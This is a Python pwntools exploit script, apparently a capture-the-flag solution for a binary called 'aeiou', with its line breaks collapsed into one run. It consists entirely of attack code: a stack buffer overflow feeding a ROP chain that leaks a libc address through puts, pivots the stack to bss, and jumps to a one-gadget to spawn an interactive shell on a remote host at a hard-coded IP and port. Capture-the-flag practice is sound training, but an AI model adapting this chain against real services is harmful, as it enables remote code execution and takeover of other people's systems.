from pwn import *from ctypes import *import urllib import hashlibfrom hashlib import sha256DEBUG = 0if DEBUG:     p = process('./aeiou')     e = ELF('./aeiou')     #scontext.log_level = 'debug'     #libc = ELF('/lib32/libc-2.24.so')     #p = process(['./babystack.dms'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc_64.so.6')})     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')     else:     p = remote('110.10.147.109',17777  )     e = ELF('./aeiou')     libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')     #libc = ELF('libc_64.so.6')def build(addr,arg1,arg2,arg3):    data=""    data+=p64(0x4026EA)    data+=p64(0)    data+=p64(1)    data+=p64(addr)    data+=p64(arg3)    data+=p64(arg2)    data+=p64(arg1)    data+=p64(0x4026D0)    data+='a'*(7*8)    return dataprdi_ret=0x00000000004026f3 #: pop rdi ; retprsi_p_ret=0x00000000004026f1 #: pop rsi ; pop r15 ; retleave_ret=0x402218prbp_ret=0x401F55bss_addr=0x604000+0x500def pwn():    #gdb.attach(p,'b*0x401436\n set follow-fork-mode child')    p.recvuntil('>>')    p.sendline('3')    p.recvuntil('number!')    p.sendline(str(0x1800))    #data='a'*0x1010+'a'*0x8+p64(prdi_ret)+p64(0x40277B)+p64(prsi_p_ret)+p64(0x00604000)+p64(0)+p64(e.plt['__isoc99_scanf'])+p64(prdi_ret)+p64(0x604000)+p64(e.plt['system'])    stri=build(e.got['read'],0,bss_addr,0x20)    data='a'*0x1010+'a'*0x8+p64(prdi_ret)+p64(e.got['read'])+p64(e.plt['puts'])+stri+p64(prdi_ret)+p64(bss_addr)+p64(prbp_ret)+p64(bss_addr+0x10)+p64(leave_ret)+p64(bss_addr+0x300)+p64(e.plt['system'])    data=data.ljust(0x1800,'a')    p.send(data)    read_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))    libc_base=read_addr-0x3da4f0    binsh_addr=libc_base+next(libc.search('/bin/sh'))    execve_addr=libc_base+libc.symbols['execve']    rce=libc_base+0x4526a    print hex(libc.symbols['read']),hex(read_addr),hex(libc_base),hex(rce)    p.send('/bin/sh\x00'+p64(bss_addr+0x300)*2+p64(rce))    p.interactive()    if __name__ == '__main__':   pwn()